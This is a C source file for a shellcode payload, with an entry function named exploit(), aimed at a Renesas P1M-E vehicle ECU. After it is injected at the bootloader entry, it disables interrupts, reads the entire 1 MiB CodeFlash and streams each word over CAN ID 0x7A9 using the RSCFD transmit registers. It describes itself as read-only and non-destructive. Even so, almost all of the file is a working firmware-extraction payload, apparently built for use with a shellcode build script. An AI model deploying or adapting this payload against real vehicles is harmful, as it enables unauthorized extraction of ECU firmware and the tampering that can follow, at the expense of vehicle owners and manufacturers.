/*
 * Conservative read-only P1M-E CodeFlash dumper.
 *
 * This translation unit performs only memory-mapped CodeFlash reads and RSCFD
 * Tx on 0x7A9. It contains no FACI/FCU erase/program path and
 * never resets the ECU.
 */

#define CODEFLASH_START       0x00000000u
#define CODEFLASH_LENGTH      0x00100000u
#define CODEFLASH_WORDS       (CODEFLASH_LENGTH / 4u)
#define PROTOCOL_VERSION      1u

#define CTRL_HELLO            0xD00D0001u
#define CTRL_RANGE_START      0xD00D0002u
#define CTRL_RANGE_LENGTH     0xD00D0003u
#define CTRL_WORD_COUNT       0xD00D0004u
#define CTRL_PROGRESS         0xD00D0010u
#define CTRL_DONE             0xD00D00FFu

#define RUNTIME_STUBS_VALID   (*(volatile unsigned int *)0xFEBF1F00)
#define RUNTIME_SAVED_STATE   (*(volatile unsigned int *)0xFEBF1F04)
#define RUNTIME_TX_FAULT      (*(volatile unsigned int *)0xFEBF1F08)
#define RUNTIME_TX_DETAIL     (*(volatile unsigned int *)0xFEBF1F0C)

#define TMSTS   ((volatile unsigned char *)0xFFD202D0)
#define TMID    ((volatile unsigned int  *)0xFFD24000)
#define TMDF0   ((volatile unsigned int  *)0xFFD2400C)
#define TMDF1   ((volatile unsigned int  *)0xFFD24010)
#define TMPTR   ((volatile unsigned int  *)0xFFD24004)
#define TMFDCTR ((volatile unsigned int  *)0xFFD24008)
#define TMC     ((volatile unsigned char *)0xFFD20250)

#define TX_BUFFER_INDEX        0x10u
#define TX_READY_MASK          0x06u
#define TX_RESULT_MASK         0x06u
#define TX_SPIN_LIMIT          0x01000000u
#define TX_FAULT_READY_TIMEOUT 0x4001u
#define TX_FAULT_DONE_TIMEOUT  0x4002u

static void feed_watchdog(void);
static void runtime_init(void);
static void send_frame(unsigned int word0, unsigned int word1);
static void transport_fault_halt(unsigned int code, unsigned int detail) __attribute__((noreturn));

/*
 * Keep the bootloader entry first in this TU. build_shellcode.py also uses
 * -fno-toplevel-reorder and rejects any compiled entry offset other than zero.
 */
void exploit(void) {
    unsigned int address;
    unsigned int count = 0u;

    asm("di");
    runtime_init();

    send_frame(CTRL_HELLO, PROTOCOL_VERSION);
    send_frame(CTRL_RANGE_START, CODEFLASH_START);
    send_frame(CTRL_RANGE_LENGTH, CODEFLASH_LENGTH);
    send_frame(CTRL_WORD_COUNT, CODEFLASH_WORDS);

    for (address = CODEFLASH_START; address < CODEFLASH_LENGTH; address += 4u) {
        volatile unsigned int *source = (volatile unsigned int *)address;
        unsigned int word = *source;
        send_frame(address, word);
        count++;

        /* One progress frame per 4096 data frames (16 KiB). */
        if ((count & 0x0FFFu) == 0u) {
            send_frame(CTRL_PROGRESS, address + 4u);
            feed_watchdog();
        }
    }

    send_frame(CTRL_DONE, count);
    while (1)
        feed_watchdog();
}

static void feed_watchdog(void) {
    /* Deliberate no-op: exact F33 field payload ran ~195 s without boot-RAM helper calls. */
}

static void runtime_init(void) {
    RUNTIME_STUBS_VALID = 0u;
    RUNTIME_SAVED_STATE = 0u;
    RUNTIME_TX_FAULT = 0u;
    RUNTIME_TX_DETAIL = 0u;
}

static void send_frame(unsigned int word0, unsigned int word1) {
    unsigned int spin;
    unsigned int status = 0u;

    for (spin = 0u; spin < TX_SPIN_LIMIT; spin++) {
        status = *(TMSTS + TX_BUFFER_INDEX);
        if ((status & TX_READY_MASK) == 0u)
            break;
    }
    if (spin == TX_SPIN_LIMIT)
        transport_fault_halt(TX_FAULT_READY_TIMEOUT, status);

    *(TMPTR   + 8 * TX_BUFFER_INDEX) = 0x80000000u;
    *(TMID    + 8 * TX_BUFFER_INDEX) = 0x7A9u;
    *(TMDF0   + 8 * TX_BUFFER_INDEX) = word0;
    *(TMDF1   + 8 * TX_BUFFER_INDEX) = word1;
    *(TMFDCTR + 8 * TX_BUFFER_INDEX) = 0u;
    *(TMC + TX_BUFFER_INDEX) |= 1u;

    for (spin = 0u; spin < TX_SPIN_LIMIT; spin++) {
        status = *(TMSTS + TX_BUFFER_INDEX);
        if ((status & TX_RESULT_MASK) != 0u)
            break;
    }
    if (spin == TX_SPIN_LIMIT)
        transport_fault_halt(TX_FAULT_DONE_TIMEOUT, status);

    *(TMSTS + TX_BUFFER_INDEX) = status & 0xF9u;
    asm("syncp");
}

static void transport_fault_halt(unsigned int code, unsigned int detail) {
    RUNTIME_TX_FAULT = code;
    RUNTIME_TX_DETAIL = detail;
    while (1)
        feed_watchdog();
}
